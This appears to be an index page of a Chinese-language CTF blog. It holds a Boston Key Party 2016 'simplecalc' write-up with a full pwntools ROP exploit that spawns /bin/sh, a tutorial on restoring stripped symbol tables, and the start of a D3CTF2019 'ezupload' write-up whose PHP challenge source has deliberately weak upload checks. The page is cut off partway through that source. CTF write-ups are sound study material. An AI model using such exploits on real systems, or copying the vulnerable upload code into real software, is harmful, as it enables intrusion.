<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Page 7 | Antel0p3&#39;s blog</title>
  <meta name="author" content="John Doe">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>Antel0p3&#39;s blog<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		wubba lubba dub dub.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/08/14/BKP2016-simplecalc-wp/" >nightmare 2.9.Boston Key Part 2016 simplecalc-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-08-14
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/07-bof_static/bkp16_simplecalc">相关资源</a>  </p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec simplecalc</span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ ./simplecalc  </span><br><span class="line">    |<span class="comment">#------------------------------------#|</span></span><br><span class="line">    |         Something Calculator         |</span><br><span class="line">    |<span class="comment">#------------------------------------#|</span></span><br><span class="line"></span><br><span class="line">Expected number of calculations: 50</span><br><span class="line">Options Menu:</span><br><span class="line"> [1] Addition.</span><br><span class="line"> [2] Subtraction.</span><br><span class="line"> [3] Multiplication.</span><br><span class="line"> [4] Division.</span><br><span class="line"> [5] Save and Exit.</span><br><span class="line">=&gt; 1</span><br><span class="line">Integer x: 1</span><br><span class="line">Integer y: 1</span><br><span class="line">Do you really need <span class="built_in">help</span> calculating such small numbers?</span><br><span class="line">Shame on you... Bye</span><br></pre></td></tr></table></figure>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/14/BKP2016-simplecalc-wp/0x1.png?raw=true" alt="img">  </p>
<ol>
<li>可以看到首先获取输入<code>v20</code>，然后进行<code>v20</code>次计算操作，计算结果存入数组<code>v21</code>中</li>
<li>当选择选项5时，会将<code>v21</code>中的内容全部拷贝到<code>v18</code>中，明显此处存在栈溢出切溢出内容我们可以通过计算结果来控制</li>
</ol>
<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>该文件是静态链接的，但是没有找到库函数<code>system</code>，并且开启了栈不可执行<br><code>ALT+T</code> 查找<code>syscall</code> 发现存在，则可以利用系统调用来实现攻击<br><code>rdi -&gt; &#39;/bin/sh&#39;字符串指针</code><br><code>rsi -&gt; 0</code><br><code>rdx -&gt; 0</code><br><code>rax -&gt; 0x3b</code>   </p>
<ol>
<li>由<code>ROPgadget</code>我们可以获取到可用pop指令地址</li>
<li>需要将’&#x2F;bin&#x2F;sh’写入到数据段中（写在栈上不知道地址，数据段地址固定）  <ul>
<li><code>ROPgadget --binary simplecalc --only &quot;mov|ret&quot;</code></li>
<li>刚好有 <code>0x0000000000400aba : mov qword ptr [rdi], rdx ; ret</code></li>
<li>则只要构造pop链将目标地址置入<code>rdi</code>，将’&#x2F;bin&#x2F;sh’置入<code>rdx</code>再调用即可</li>
</ul>
</li>
<li>最后构造pop链执行<code>syscall</code></li>
</ol>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./simplecalc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addSingle</span>(<span class="params">x</span>):</span><br><span class="line">	proc.recvuntil(<span class="string">&quot;=&gt; &quot;</span>)</span><br><span class="line">	proc.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	proc.recvuntil(<span class="string">&quot;Integer x: &quot;</span>)</span><br><span class="line">	proc.sendline(<span class="string">&quot;100&quot;</span>)</span><br><span class="line">	proc.recvuntil(<span class="string">&quot;Integer y: &quot;</span>)</span><br><span class="line">	proc.sendline(<span class="built_in">str</span>(x - <span class="number">100</span>))  <span class="comment"># 注意代码要求任意参与运算的数字都要大于0x27</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">z</span>): </span><br><span class="line">    <span class="comment"># 注意数组中每个位置为int(dword型)，</span></span><br><span class="line">    <span class="comment"># 64位栈内基本块为qword，因此要分高低32位分别存入</span></span><br><span class="line">	x = z &amp; <span class="number">0xffffffff</span></span><br><span class="line">	y = ((z &amp; <span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span>) </span><br><span class="line">	addSingle(x)</span><br><span class="line">	addSingle(y)</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    b * 0x401545</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">rax_ret = <span class="number">0x44db34</span></span><br><span class="line">rdx_ret = <span class="number">0x437a85</span></span><br><span class="line">rdi_ret = <span class="number">0x401b73</span></span><br><span class="line">rsi_ret = <span class="number">0x401c87</span></span><br><span class="line">syscall = <span class="number">0x400488</span></span><br><span class="line">dest = <span class="number">0x6C4480</span></span><br><span class="line">mv_rdx2_prdi = <span class="number">0x400aba</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># rdi_ret + dest + rdx_ret + b&#x27;/bin/sh\x00&#x27; + mv_rdx2_prdi</span></span><br><span class="line"><span class="comment"># rsi_ret + p64(0) + rdx_ret + p64(0) + rax_ret + p64(0x3b) + syscall</span></span><br><span class="line">sla(<span class="string">b&#x27;calculations: &#x27;</span>, <span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    <span class="comment"># 填满当前栈空间，注意填到v21时最好填0，</span></span><br><span class="line">    <span class="comment"># 因为代码会对v21进行free操作，填其他的可能触发段错误</span></span><br><span class="line">    add(<span class="number">0</span>)       </span><br><span class="line"></span><br><span class="line">add(rdi_ret)  </span><br><span class="line">add(dest)</span><br><span class="line">add(rdx_ret)</span><br><span class="line">add(<span class="number">0x0068732f6e69622f</span>)   <span class="comment"># /bin/sh</span></span><br><span class="line"></span><br><span class="line">add(mv_rdx2_prdi)</span><br><span class="line">add(rsi_ret)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(rdx_ret)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(rax_ret)</span><br><span class="line">add(<span class="number">0x3b</span>)</span><br><span class="line">add(syscall)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;=&gt; &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
	
	</div>
  <a type="button" href="/2023/08/14/BKP2016-simplecalc-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/08/12/symbol-restore/" >符号表恢复</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-08-12
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p>遇到静态编译且符号表被抠除的程序（如下图），很不利于分析</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/12/symbol-restore/0x1.png?raw=true" alt="img"></p>
<p>以下介绍恢复符号表的几种方法  </p>
<h2 id="1-IDA-flair"><a href="#1-IDA-flair" class="headerlink" title="1. IDA flair"></a>1. IDA flair</h2><p>flair通过选择的签名文件和程序中的函数进行签名匹配来帮助我们还原库函数<br>其中签名文件可以从<a target="_blank" rel="noopener" href="https://github.com/push0ebp/sig-database">sig-database</a>中获取，有制作好的各架构各版本签名文件    </p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><ol>
<li>将签名文件(sig文件)导入到IDA的对应签名目录下<code>IDAx.x\sig\pc</code></li>
<li>IDA中按住<code>SHIFT+F5</code></li>
<li>右键选择<code>Apply new signature...</code><br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/12/symbol-restore/0x2.png?raw=true" alt="img">   </li>
<li>选择签名文件进行匹配<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/12/symbol-restore/0x3.png?raw=true" alt="img">    </li>
<li>多尝试几个签名文件，直到成功匹配函数数量最多（Ctrl+Z 撤销之前选择的签名文件）<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/12/symbol-restore/0x4.png?raw=true" alt="img"><br>可以看到很多函数名已经恢复，代码也就好分析多了</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这种方法恢复符号表无需联网，但恢复有时效果也不好，在某些不能联网的比赛中可以作为首选</p>
<h2 id="2-自动检测脚本lscan"><a href="#2-自动检测脚本lscan" class="headerlink" title="2. 自动检测脚本lscan"></a>2. 自动检测脚本lscan</h2><p><a target="_blank" rel="noopener" href="https://github.com/maroueneboubakri/lscan">lscan</a>可以自动检测静态二进制程序使用的libc版本</p>
<h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/maroueneboubakri/lscan</span><br><span class="line"><span class="built_in">cd</span> lscan</span><br><span class="line">python lscan -S [签名文件所在目录] -f [待检测文件]</span><br><span class="line"><span class="comment"># python lscan -S ./i386/sig -f ../bin</span></span><br></pre></td></tr></table></figure>

<h2 id="3-IDA-Finger插件"><a href="#3-IDA-Finger插件" class="headerlink" title="3. IDA Finger插件"></a>3. IDA Finger插件</h2><p>Finger是阿里云·云安全技术实验室推出的一款二进制函数符号识别引擎，可以识别二进制程序中的库函数与常见的第三方函数，快速定位恶意代码，提高样本分析效率   </p>
<h3 id="使用方法-2"><a href="#使用方法-2" class="headerlink" title="使用方法"></a>使用方法</h3><ol>
<li>pip 安装finger_sdk<br><code>pip install finger_sdk</code><br>注意安装Finger的python的版本要与IDAPython的版本一致</li>
<li>将<a target="_blank" rel="noopener" href="https://github.com/aliyunav/Finger/blob/master/finger_plugin.py">Finger IDA plugin</a>复制到IDA插件目录<code>IDAx.x\plugins</code>中  </li>
<li>重启IDA 在顶部菜单栏中可以看见<code>Finger</code>，选择支持单个函数、选中的多个函数和全部函数识别</li>
</ol>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>这种方法识别精度高，但需要联网并且函数较多时速度很慢</p>

	
	</div>
  <a type="button" href="/2023/08/12/symbol-restore/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/08/10/D3CTF2019-ezupload/" >D3CTF2019-ezupload</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-08-10
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1203">题目链接</a></p>
<p>访问得到源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userdir = <span class="string">&quot;upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename  =  <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;userdir != <span class="string">&quot;upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$r</span>[<span class="string">&#x27;scheme&#x27;</span>]) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|php/i&quot;</span>,<span class="variable">$r</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$this</span>-&gt;filename,<span class="string">&#x27;..&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$this</span>-&gt;filename,<span class="string">&#x27;/&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;filename, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$this</span>-&gt;filename, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkdir</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkurl</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkext</span>();</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;url,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?|value|on|type|flag|auto|set|\\\\/i&quot;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;filename,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkdir</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkext</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$dir</span> === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$num</span> = <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$num</span> = <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$dir</span>)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you have <span class="subst">$num</span> files&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you don&#x27;t have file&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot; &quot;</span>,<span class="title function_ invoke__">scandir</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = <span class="string">&quot;your file in : 